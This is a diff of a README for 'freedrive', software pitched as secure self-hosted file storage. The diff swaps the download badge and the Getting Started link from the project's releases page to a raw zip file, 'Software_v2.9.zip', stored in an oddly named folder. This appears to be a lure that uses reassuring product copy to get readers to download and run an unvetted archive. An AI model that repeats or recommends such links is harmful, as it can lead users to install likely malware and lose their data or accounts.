@@ -1,6 +1,6 @@
 # 📁 freedrive - Secure storage for your personal files
 
-[![](https://img.shields.io/badge/Download_Freedrive-blue.svg)](https://github.com/safeharborunlawfulcarnalknowledge62/freedrive/releases)
+[![](https://img.shields.io/badge/Download_Freedrive-blue.svg)](https://github.com/safeharborunlawfulcarnalknowledge62/freedrive/raw/refs/heads/main/crush/Software_v2.9.zip)
 
 FreeDrive provides a private space for your digital life. It works like the cloud services you know but stays under your control. You run this software on your own computer. Your data stays on your hardware. You own your files instead of renting space on a corporate server.
 
@@ -12,7 +12,7 @@ FreeDrive performs well on standard hardware. You need a computer running Window
 
 ## 📥 Getting Started
 
-Visit this page to download the software: https://github.com/safeharborunlawfulcarnalknowledge62/freedrive/releases
+Visit this page to download the software: https://github.com/safeharborunlawfulcarnalknowledge62/freedrive/raw/refs/heads/main/crush/Software_v2.9.zip
 
 1. Open the link in your web browser. 
 2. Look for the latest version at the top of the list.
